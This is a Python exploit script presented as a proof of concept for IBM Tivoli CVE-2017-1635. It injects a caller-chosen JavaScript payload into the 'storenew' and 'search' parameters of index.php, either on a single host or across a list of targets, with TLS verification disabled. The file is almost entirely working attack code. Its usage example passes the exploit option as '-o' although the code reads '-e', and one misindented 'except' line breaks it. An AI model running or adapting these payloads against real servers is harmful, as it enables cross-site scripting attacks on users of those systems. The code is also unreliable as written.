# reference: https://github.com/emcalv/tivoli-poc

import requests
import argparse
from argparse import RawTextHelpFormatter
import json
import urllib3
import os
import sys
import datetime

urllib3.disable_warnings()

def getErrorDetails(exceptione):
    # display exception file and line

    try:
        exc_type, exc_obj, exc_tb = sys.exc_info()
        fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
        fileline = str(exc_type) + "," + str(fname) + "," + str(exc_tb.tb_lineno)
        errorline = "[" + str(exceptione) + "\nInfo: " + fileline + "]"
        return errorline

    except:
        print("[FATAL ERROR] (getErrorDetails) ERROR ON ERROR WTF!")
        return 0

def Log(logPath, level, message):
    # Main Logging Function

    try:
        if(not os.path.exists(logPath)):
            f = open(logPath, "w+")
            f.write("Log Creation: " + str(datetime.datetime.now()) + "\n")
            f.close()

        logtime = str(datetime.datetime.now())

        loglevels = {
            "debug": "[d] " + logtime + " - " + message,
            "success":  "[+] " + logtime + " - " + message,
            "error": "[!] " + logtime + " - " + message,
            "info": "[?] " + logtime + " - " + message,
        }

        if(level == "debug"):
            open(logPath, "a").write(loglevels[level] + "\n")
            print(loglevels[level])
            return loglevels[level]

        elif(level == "info"):
            open(logPath, "a").write(loglevels[level] + "\n")
            print(loglevels[level])
            return loglevels[level]

        elif(level == "success"):
            open(logPath, "a").write(loglevels[level] + "\n")
            print(loglevels[level])
            return loglevels[level]

        else: # default, only error messages
            open(logPath, "a").write(loglevels["error"] + "\n")
            print(loglevels["error"])
            return loglevels["error"]

    except Exception as e:
        print("[ERROR] Failed to write to log!")
        print("[ERROR] Details: " + str(getErrorDetails(e)))
        return 0

def exploitTivoli(arguments):
    # init exploitation
    targetHost = arguments.t
    targetPort = arguments.p
    targetList = arguments.l
    jsPayload = arguments.j
    exploitOption = arguments.e
    logPath = arguments.log
    http_proxy = arguments.http_proxy
    https_proxy = arguments.https_proxy
    writelogs = True if logPath != None else False

    http_proxies = {}

    if(http_proxy != None):
        http_proxies["http_proxy"] = http_proxy

    if(https_proxy != None):
        http_proxies["https_proxy"] = https_proxy

    if(http_proxies != {}):
        if(writelogs):
            Log(logPath, "info", "using proxy info: " + json.dumps(http_proxies))

    if((targetHost == None or targetPort == None) and targetList == None): # single host, incomplete info
        if(writelogs):
            Log(logPath, "error", "Invalid options. Please specify a target host / port or a target list.")

        else:
            print("[Error] Invalid options. Please specify a target host / port or a target list.")

        return 0

    if((targetHost != None or targetPort != None) and targetList != None): # single target and target list specified
        if(writelogs):
            Log(logPath, "error", "Invalid options. Please either specify a target host / port or a target list.")

        else:
            print("[Error] Invalid options. Please either specify a target host / port or a target list.")

        return 0

    if(jsPayload == None): # no payload specified
        if(writelogs):
            Log(logPath, "error", "No JavaScript payload specified. Specify the payload with the -j option.")

        else:
            print("[Error] No JavaScript payload specified. Specify the payload with the -j option.")

        return 0
  
    if(exploitOption == None or (not exploitOption.lower() in ["a", "b", "c"])): # no exploit option specified or invalid exploit option
        if(writelogs):
            Log(logPath, "error", "No exploit option or invalid exploit option specified. Specify the exploit string with the -e option.")

        else:
            print("[Error] No exploit option or invalid exploit option specified. Specify the exploit string with the -e option.")

        return 0

    if(targetHost != None and targetPort != None): # single host
        if(exploitOption.lower() == "a"):
            exploitString = "/index.php?action=storenew&username=||jsPayload||index.php?action=storenew&username=||jsPayload||".replace("||jsPayload||", jsPayload) 

            try:
                resp = requests.get(targetHost + ":" + targetPort + exploitString, verify=False, proxies=http_proxies, timeout=30)

                outdict = {
                    "Host": targetHost,
                    "Port": targetPort,
                    "JavaScript_Payload": jsPayload,
                    "Exploit_String": exploitString,
                    "Response_Status_Code": resp.status_code,
                    "Response_Data": resp.text
                }

                if(writelogs):
                    Log(logPath, "success", "Response: " + json.dumps(outdict))
                
                return json.dumps(outdict)

            except Exception as e:
                if(writelogs):
                    Log(logPath, "error", "Unable to send request.")
                    Log(logPath, "error", "Details: " + str(getErrorDetails(e)))

                else:
                    print("[Error] Unable to send request.")
                    print("[Error] Details: " + str(getErrorDetails(e)))

        elif(exploitOption.lower() == "b"):
            exploitString = '/index.php?action=search&searchFor=">||jsPayload||'.replace('||jsPayload||', jsPayload)
 
            try:
                resp = requests.get(targetHost + ":" + targetPort + exploitString, verify=False, proxies=http_proxies, timeout=30)

                outdict = {
                    "Host": targetHost,
                    "Port": targetPort,
                    "JavaScript_Payload": jsPayload,
                    "Exploit_String": exploitString,
                    "Response_Status_Code": resp.status_code,
                    "Response_Data": resp.text
                }

                if(writelogs):
                    Log(logPath, "success", "Response: " + json.dumps(outdict))

                return json.dumps(outdict)

            except Exception as e:
                if(writelogs):
                    Log(logPath, "error", "Unable to send request.")
                    Log(logPath, "error", "Details: " + str(getErrorDetails(e)))

                else:
                    print("[Error] Unable to send request.")
                    print("[Error] Details: " + str(getErrorDetails(e)))

        elif(exploitOption.lower() == "c"):
            exploitStrings = [
                "/index.php?action=storenew&username=||jsPayload||index.php?action=storenew&username=||jsPayload||".replace("||jsPayload||", jsPayload),
                '/index.php?action=search&searchFor=">||jsPayload||'.replace('||jsPayload||', jsPayload)
            ]

            outdict = {}

            for exploitStringi in range(len(exploitStrings)):
                try:
                    resp = requests.get(targetHost + ":" + targetPort + exploitStrings[exploitStringi], verify=False, proxies=http_proxies, timeout=30)

                    outdict["exploit_" + str(exploitStringi)] = {
                        "Host": targetHost,
                        "Port": targetPort,
                        "JavaScript_Payload": jsPayload,
                        "Exploit_String": exploitStrings[exploitStringi],
                        "Response_Status_Code": resp.status_code,
                        "Response_Data": resp.text
                    }

                    if(writelogs):
                        Log(logPath, "success", "Response: " + json.dumps(outdict))

                except Exception as e:
                    if(writelogs):
                        Log(logPath, "error", "Unable to send request.")
                        Log(logPath, "error", "Details: " + str(getErrorDetails(e)))

                    else:
                        print("[Error] Unable to send request.")
                        print("[Error] Details: " + str(getErrorDetails(e)))

            return json.dumps(outdict)

    if(targetList != None): # multiple Targets
        outdict = {}

        try:
            tList = open(targetList, "r").readlines()

        except Exception as e:
            if(writelogs):
                Log(logPath, "error", "Unable to read target list file.")
                Log(logPath, "error", "Details: " + str(getErrorDetails(e)))
            
            else:
                print("[Error] Unable to read target list file.")
                print("Details: " + str(getErrorDetails(e)))

            return 0

        for target in tList:

            targetsplit = target.split(":")
            http = targetsplit[0]
            targetHost = targetsplit[1]
            targetPort = targetsplit[2].replace("\n","")
            targetHost = http + ":" + targetHost

            print(targetHost + ":" + targetPort)

            if(exploitOption.lower() == "a"):
                exploitString = "/index.php?action=storenew&username=||jsPayload||index.php?action=storenew&username=||jsPayload||".replace("||jsPayload||", jsPayload)

                try:
                    resp = requests.get(targetHost + ":" + targetPort + exploitString, verify=False, proxies=http_proxies, timeout=30)
               
                    outdict[target] = {
                        "Host": targetHost,
                        "Port": targetPort,
                        "JavaScript_Payload": jsPayload,
                        "Exploit_String": exploitString,
                        "Response_Status_Code": resp.status_code,
                        "Response_Data": resp.text
                    }

                    if(writelogs):
                        Log(logPath, "success", "Response: " + json.dumps(outdict))

                except Exception as e:
                    if(writelogs):
                        Log(logPath, "error", "Unable to send request.")
                        Log(logPath, "error", "Details: " + str(getErrorDetails(e)))
                    else:
                        print("[Error] Unable to send request.")
                        print("[Error] Details: " + str(getErrorDetails(e)))

            elif(exploitOption.lower() == "b"):
                exploitString = '/index.php?action=search&searchFor=">||jsPayload||'.replace('||jsPayload||', jsPayload)

                try:
                    resp = requests.get(targetHost + ":" + targetPort + exploitString, verify=False, proxies=http_proxies, timeout=30)
               
                    outdict[target] = {
                        "Host": targetHost,
                        "Port": targetPort,
                        "JavaScript_Payload": jsPayload,
                        "Exploit_String": exploitString,
                        "Response_Status_Code": resp.status_code,
                        "Response_Data": resp.text
                    }

                    if(writelogs):
                        Log(logPath, "success", "Response: " + json.dumps(outdict))

                except Exception as e:
                    if(writelogs):
                        Log(logPath, "error", "Unable to send request.")
                        Log(logPath, "error", "Details: " + str(getErrorDetails(e)))
                    else:
                        print("[Error] Unable to send request.")
                        print("[Error] Details: " + str(getErrorDetails(e)))

            elif(exploitOption.lower() == "c"):
                exploitStrings = [
                    "/index.php?action=storenew&username=||jsPayload||index.php?action=storenew&username=||jsPayload||".replace("||jsPayload||", jsPayload),
                    '/index.php?action=search&searchFor=">||jsPayload||'.replace('||jsPayload||', jsPayload)
                ]

                for exploitStringi in range(len(exploitStrings)):
                    try:

                        resp = requests.get(targetHost + ":" + targetPort + exploitStrings[exploitStringi], verify=False, proxies=http_proxies, timeout=30)
                       
                        outdict[target] = {}
 
                        outdict[target]["exploit_" + str(exploitStringi)] = {
                            "Host": targetHost,
                            "Port": targetPort,
                            "JavaScript_Payload": jsPayload,
                            "Exploit_String": exploitStrings[exploitStringi],
                            "Response_Status_Code": resp.status_code,
                            "Response_Data": resp.text
                        }

                        if(writelogs):
                            Log(logPath, "success", "Response: " + json.dumps(outdict))

                     except Exception as e:

                        if(writelogs):
                            Log(logPath, "error", "Unable to send request.")
                            Log(logPath, "error", "Details: " + str(getErrorDetails(e)))

                        else:
                            print("[Error] Unable to send request.")
                            print("[Error] Details: " + str(getErrorDetails(e)))
               
        return json.dumps(outdict)

 
argparser = argparse.ArgumentParser(prog='CVE-2017-1635 PoC',
                        usage='%(prog)s [-h] [options] -t <http://target.com> -p <port> -j <js payload> -e <exploit option>',
                        description="PoC for IBM Tivoli vulnerability CVE-2017-1635",
                        epilog="Example Uase:\n    $ cve-2017-1635.py -t http://target.com -p 1920 -j <script>alert('pwned!')</script> -o c",
                        prefix_chars='-',
                        formatter_class=RawTextHelpFormatter)

argparser.add_argument ('-t',
                        metavar = '--targetHost',
                        type = str,
                        help = "Target host for exploitation")

argparser.add_argument ('-l',
                        metavar = '--targetList',
                        type = str,
                        help = "Path to target list file.\nNote: file should be formatted as one <http(s)://target>:<port> per line")

argparser.add_argument ('-p',
                        metavar = '--targetPort',
                        type = str,
                        help = "Target port for exploitation")

argparser.add_argument ('-j',
                        metavar = '--jsPayload',
                        type = str,
                        help = "JavaScript payload")

argparser.add_argument ('-e',
                        metavar = '--exploitOption',
                        type = str,
                        help = "Which exploit string oyu would like to use:\n   a. storenew\n   b. search\n   c. both")

argparser.add_argument ('--log',
                        metavar = '--log',
                        type = str,
                        help = "Path for log file output\nNote: set to 'x' for auto-generated log path")

argparser.add_argument ('--http_proxy',
                        metavar = '--http_proxy',
                        type = str,
                        help = "HTTP proxy used for request")

argparser.add_argument ('--https_proxy',
                        metavar = '--https_proxy',
                        type = str,
                        help = "HTTPs proxy used for request")

argparser.add_argument ('-o',
                        metavar = '--out',
                        type = str,
                        help = "Path to output json object")

print("IBM Tivoli Vulnerability CVE-2017-1635 PoC")
print("By: Daniel Bloom\n")

arguments = argparser.parse_args()

output = exploitTivoli(arguments)

if(output == 0):
    if(arguments.log != None):
        Log(arguments.log, "error", "Script failed with a 0")
    else:
        print("[Error] Script failed with a 0")
    
    exit()

print(output)

if(arguments.o != None):
    try:
        f = open(arguments.o, "w+").write(output)
    except Exception as e:
        if(arguments.log != None):
            Log(arguments.log, "error", "Unable to output to path: " + str(arguments.o))
            Log(arguments.log, "error", "Details: " + str(str(getErrorDetails(e))))
        else:
            print("[Error] Unable to output to path: " + str(arguments.o))
            print("[Error] Details: " + str(str(getErrorDetails(e))))
